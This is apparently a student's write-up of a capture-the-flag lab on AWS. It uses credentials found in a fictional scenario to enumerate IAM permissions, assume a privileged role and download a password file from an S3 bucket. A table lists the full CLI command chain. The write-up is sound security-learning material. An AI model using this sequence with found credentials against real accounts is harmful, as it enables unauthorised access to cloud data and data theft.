## Day 23 – AWS Security and IAM Privilege Enumeration

### Scenario Overview

A stealthy TBFC elf discovered a set of **AWS cloud credentials** on Sir Carrotbane’s desk. These credentials could provide access to TBFC’s cloud resources. Using these credentials, we investigated what access the user had, enumerated permissions, and attempted to regain access to S3 buckets containing sensitive data.

---

### My Role

I acted as a **Cloud Security Analyst / Red Team Operator**, tasked with:

* Enumerating IAM users, groups, roles, and policies.
* Determining the scope of permissions granted to Sir Carrotbane’s account.
* Assuming roles to gain elevated privileges.
* Exfiltrating files from an S3 bucket to simulate unauthorized access.

---

### Investigative Approach

1. **Enumerated IAM Users:**
   Determined what users exist in the account using AWS CLI.

2. **Analyzed User Policies:**
   Checked for inline and attached policies to see what actions the user could perform.

3. **Checked Group Membership:**
   Verified whether the user was part of any groups for inherited permissions.

4. **Enumerated and Assumed Roles:**
   Found roles the user could assume (sts:AssumeRole) and reviewed their permissions.

5. **Accessed S3 Buckets:**
   Used the assumed role’s permissions to list bucket contents and download sensitive objects.

6. **Documented Findings:**
   Recorded IAM structure, role permissions, and successful exfiltration for learning and reporting.

---

### Commands Reference Table

| Purpose                     | Command                                                                                                          |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| List IAM users              | `aws iam list-users`                                                                                             |
| List inline user policies   | `aws iam list-user-policies --user-name sir.carrotbane`                                                          |
| List attached user policies | `aws iam list-attached-user-policies --user-name sir.carrotbane`                                                 |
| List groups for user        | `aws iam list-groups-for-user --user-name sir.carrotbane`                                                        |
| Get inline policy document  | `aws iam get-user-policy --user-name sir.carrotbane --policy-name POLICYNAME`                                    |
| List IAM roles              | `aws iam list-roles`                                                                                             |
| List inline role policies   | `aws iam list-role-policies --role-name bucketmaster`                                                            |
| Get role policy document    | `aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy`                              |
| Assume a role               | `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC`            |
| Set temporary credentials   | `export AWS_ACCESS_KEY_ID="..."` <br> `export AWS_SECRET_ACCESS_KEY="..."` <br> `export AWS_SESSION_TOKEN="..."` |
| Verify assumed role         | `aws sts get-caller-identity`                                                                                    |
| List all S3 buckets         | `aws s3api list-buckets`                                                                                         |
| List objects in bucket      | `aws s3api list-objects --bucket easter-secrets-123145`                                                          |
| Download file from S3       | `aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt`                |

---

### Key Findings

* Sir Carrotbane had an **inline policy** allowing IAM entity enumeration and `sts:AssumeRole`.
* The **bucketmaster role** could:

  * List all buckets
  * List specific buckets (`easter-secrets-123145`, `bunny-website-645341`)
  * Get objects from `easter-secrets-123145`
* Successfully assumed the **bucketmaster role** and exfiltrated `cloud_password.txt` from the S3 bucket.

---

### Outcome

By enumerating IAM entities and assuming the role with proper permissions, we were able to access sensitive cloud resources and demonstrate how **misconfigured IAM policies** can expose an organization to significant security risks. This highlighted the importance of **least privilege principles** and secure cloud credential management.

---

### Skills & Concepts Learned

* AWS IAM hierarchy: Users, Groups, Roles, and Policies
* Enumerating permissions with AWS CLI
* Role assumption using AWS STS
* Accessing and downloading objects from S3
* Security implications of misconfigured IAM roles and policies
* Practical Red Team methodology in a cloud environment

---
